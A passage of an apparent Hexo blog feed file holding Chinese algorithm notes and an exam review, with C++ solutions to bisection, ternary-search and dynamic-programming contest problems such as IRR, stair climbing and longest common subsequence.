class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> EPS = <span class="number">1e-10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">calc</span><span class="params">(<span class="keyword">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// f(x) = -(x-3)^2 + 2;</span></span><br><span class="line">    <span class="keyword">return</span> -(x<span class="number">-3.0</span>)*(x<span class="number">-3.0</span>) + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">ternarySearch</span><span class="params">(<span class="keyword">double</span> low, <span class="keyword">double</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> mid, midmid;</span><br><span class="line">    <span class="keyword">while</span> (low + EPS &lt; high)</span><br><span class="line">    &#123;</span><br><span class="line">        mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">        midmid = (mid + high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">double</span> mid_value = calc(mid);</span><br><span class="line">        <span class="keyword">double</span> midmid_value = calc(midmid);</span><br><span class="line">        <span class="keyword">if</span> (mid_value &gt; midmid_value)</span><br><span class="line">            high = midmid;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            low = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> low;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>递归方程求解方法</title>
      <link href="/2020/09/10/diguifangcheng/"/>
      <url>/2020/09/10/diguifangcheng/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一篇关于递归方程求解的简单方法</p></blockquote><a id="more"></a> <p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/c80f8ba61b50134f.png" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/53b9ee8ad5d06943.png" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/e9584002e4935b00.png" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/74d45c8beee02787.png" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/1ab44311b27c9fc9.png" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/d84ad2a1c9ca2c49.png" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/880d4ce696b29e84.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法考试复习</title>
      <link href="/2020/09/08/algorithm1/"/>
      <url>/2020/09/08/algorithm1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一篇算法实验课考试复习</p></blockquote><a id="more"></a> <h2 id="递归与分治"><a href="#递归与分治" class="headerlink" title="递归与分治"></a>递归与分治</h2><h3 id="内部收益率"><a href="#内部收益率" class="headerlink" title="内部收益率"></a>内部收益率</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/01a4c1588c7e83bb.png" alt="img"></p><h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/613e4b3974842675.png" alt="img"></p><h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><p>对于每组数据，输出仅一行，即项目的IRR，四舍五入保留小数点后两位。</p><h4 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">-1 2</span><br><span class="line">2</span><br><span class="line">-8 6 9</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h4 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.00</span><br><span class="line">0.50</span><br></pre></td></tr></table></figure><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, f, CF[<span class="number">12</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; f;</span><br><span class="line">        <span class="keyword">double</span> mid, high = <span class="number">10000</span>, low = <span class="number">-1</span>, r, k, sum;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; CF[i];</span><br><span class="line">        <span class="keyword">while</span> (high - low &gt; <span class="number">1.0e-6</span>)    </span><br><span class="line">        &#123;</span><br><span class="line">            mid = (high + low) / <span class="number">2</span>; </span><br><span class="line">            k = <span class="number">1</span>;</span><br><span class="line">            sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                k *= (<span class="number">1.0</span> / (<span class="number">1</span> + mid)); </span><br><span class="line">                sum += CF[j] * k;  </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum + f &gt; <span class="number">0</span>)</span><br><span class="line">                low = mid;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                high = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; fixed &lt;&lt; setprecision(<span class="number">2</span>) &lt;&lt; mid &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="问题-J-奶牛的聚会"><a href="#问题-J-奶牛的聚会" class="headerlink" title="问题 J: 奶牛的聚会"></a>问题 J: 奶牛的聚会</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>农历新年马上就要到了，奶牛们计划举办一次聚会庆祝新年的到来。但是，奶牛们并不喜欢走太远的路，这会给他们的聚会带来消极情绪，当一头奶牛的消极指数为Wi，他参加聚会所需行走的距离为si，那么他就会给聚会带来Si3*Wi的消极情绪。所有奶牛所在位置都在一条直线上，已知所有奶牛的坐标和消极指数，求如何确定聚会地点，使得所有奶牛给聚会带来的消极情绪之和最小，输出消极情绪之和的最小值。</p><h4 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h4><p>第一行包含一个整数 Ca(Ca&lt;=20) ，表示有 Ca 组测试数据。</p><p>对于每组测试数据：第一行包含一个整数n(1&lt;=n&lt;=50000) ，表示奶牛的数量。接下来 n 行每行包含两个浮点数Si和wi (-106&lt;=Si&lt;=106, 0&lt;Wi&lt;15)。</p><h4 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h4><p>对于每组测试数据，输出 “Case #c: ans” ，其中c表示测试数据编号，ans表示消极情绪之和的最小值，结果四舍五入为一个整数。</p><h4 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">5</span><br><span class="line">0.9 2</span><br><span class="line">1.4 4</span><br><span class="line">3.1 1</span><br><span class="line">6.2 1</span><br><span class="line">8.3 2</span><br></pre></td></tr></table></figure><h4 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Case #1: 300</span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>三分查找法确定消极情绪之和最小的位置，结合注释应该不难理解。</p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">50010</span>;</span><br><span class="line"><span class="keyword">double</span> Si[maxn], wi[maxn];</span><br><span class="line"><span class="keyword">int</span> n, Ca;</span><br><span class="line"><span class="comment">//计算聚会位置在pos时的消极情绪之和</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">ans</span><span class="params">(<span class="keyword">double</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//计算每个奶牛距离聚会位置的距离(非负)</span></span><br><span class="line">        <span class="keyword">double</span> dist = Si[i] - pos;</span><br><span class="line">        <span class="keyword">if</span> (dist &lt; <span class="number">0</span>)</span><br><span class="line">            dist = -dist;</span><br><span class="line">        sum += <span class="built_in">pow</span>(dist, <span class="number">3</span>) * wi[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; Ca;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= Ca; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; Si[j] &gt;&gt; wi[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找到坐标位置最小的奶牛</span></span><br><span class="line">        <span class="keyword">double</span> low = Si[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            <span class="keyword">if</span> (Si[k] &lt; low)</span><br><span class="line">                low = Si[k];</span><br><span class="line">        <span class="comment">//找到坐标位置最小的奶牛</span></span><br><span class="line">        <span class="keyword">double</span> high = Si[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; n; l++)</span><br><span class="line">            <span class="keyword">if</span> (Si[l] &gt; high)</span><br><span class="line">                high = Si[l];</span><br><span class="line">        <span class="comment">//三分查找法确定最终位置</span></span><br><span class="line">        <span class="keyword">while</span> (high - low &gt; <span class="number">1e-7</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">double</span> m1 = (high + low) / <span class="number">2.0</span>;</span><br><span class="line">            <span class="keyword">double</span> m2 = (m1 + high) / <span class="number">2.0</span>;</span><br><span class="line">            <span class="keyword">if</span> (ans(m1) &gt; ans(m2))</span><br><span class="line">                low = m1;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                high = m2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case #"</span> &lt;&lt; i &lt;&lt; <span class="string">": "</span> &lt;&lt; ll(ans(low) + <span class="number">0.5</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="问题-E-光合作用"><a href="#问题-E-光合作用" class="headerlink" title="问题 E: 光合作用"></a>问题 E: 光合作用</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>蒜头是个爱学习的孩子，他总喜欢在生活中做一些小实验，这次蒜头想研究一下光合作用。蒜头的实验材料有如下几样：神奇的种子，普通的纸箱和一些光源。一开始，蒜头将种子均匀的种在了箱子底部，你可以将其看成 X 轴，种子的位置为 X 轴上的点。然后蒜头用纸板将箱子盖住，并在纸板上安装了一些光源（具体见图，顶上的为光源，光源两边与顶部的夹角都为45度，黄色部分为光照，绿色的为植物。）。神奇的种子会在有光的情况下一直向上生长直到没光为止。现在蒜头想知道当实验结束时每颗种子的高度是多少？</p><h4 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h4><p>第一行输入一个整数 T，表示测试数据的组数。</p><p>每组数据的第一行是三个整数 n,m,h(1&lt;=n,m&lt;=1e5,0&lt;=m&lt;=1e5,1&lt;=h&lt;=1e4),n表示种子数(编号为1,2…n)，m表示光源数,h 表示箱子的高度。</p><p>接下来m行，每行一个整数Xi表示第i个光源在顶部的位置。</p><h4 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h4><p>对于每组测试数据，请输出n行，每行一个数表示第i颗种子的最终高度。</p><h4 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">7 1 2</span><br><span class="line">4</span><br><span class="line">4 4 1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h4 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">0</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>二分法</p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">/*********************************************************************************************</span></span><br><span class="line"><span class="comment">lower_bound( begin,end,num)：从数组的begin位置到end-1位置二分查找第一个大于或等于num的数字，找到返回该数字的地址，不存在则返回end。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</span></span><br><span class="line"><span class="comment">upper_bound( begin,end,num)：从数组的begin位置到end-1位置二分查找第一个大于num的数字，找到返回该数字的地址，不存在则返回end。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</span></span><br><span class="line"><span class="comment">********************************************************************************************/</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> x[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">while</span> (T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n, m, h;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m &gt;&gt; h;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; x[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(x + <span class="number">1</span>, x + m + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> cnt = lower_bound(x + <span class="number">1</span>, x + m + <span class="number">1</span>, i) - x;</span><br><span class="line">            <span class="keyword">if</span> (cnt == <span class="number">1</span> &amp;&amp; m != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, h - x[cnt] + i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (cnt == m + <span class="number">1</span> &amp;&amp; m != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, h - i + x[cnt - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (m != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">max</span>(h - i + x[cnt - <span class="number">1</span>], h - x[cnt] + i));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><h3 id="跳台阶"><a href="#跳台阶" class="headerlink" title="跳台阶"></a>跳台阶</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p><h4 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h4><p>多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100)</p><h4 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h4><p>每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量.</p><p>所得到的结果模1000000007</p><h4 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h4 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>可以有多种方法，我这里选用动态规划。</p><p>dp[i]表示i阶台阶的跳法有多少种，一次只能跳一阶或两阶。</p><p>已知dp[1]=1,dp[2]=2，所以dp[i]=dp[i-1]+dp[i-2]，表示：<br>到达i阶 = （最后一步跳一阶到达i）+ (最后一步跳两阶到达i)</p><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">105</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">climb</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[i] = (dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>]) % <span class="number">1000000007</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; climb(n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h3><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</p><h4 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h4><p>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p><h4 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h4><p>对于每组输入，输出两个字符串的最长公共子序列的长度。</p><h4 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcfbc abfcab</span><br><span class="line">programming contest </span><br><span class="line">abcd mnp</span><br></pre></td></tr></table></figure><h4 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">2</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/cef5d8d862235e4c.png" alt="img"></p><p><img src="https://aotle.oss-cn-beijing.aliyuncs.com/431883cb40da5458.png" alt="img"></p><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 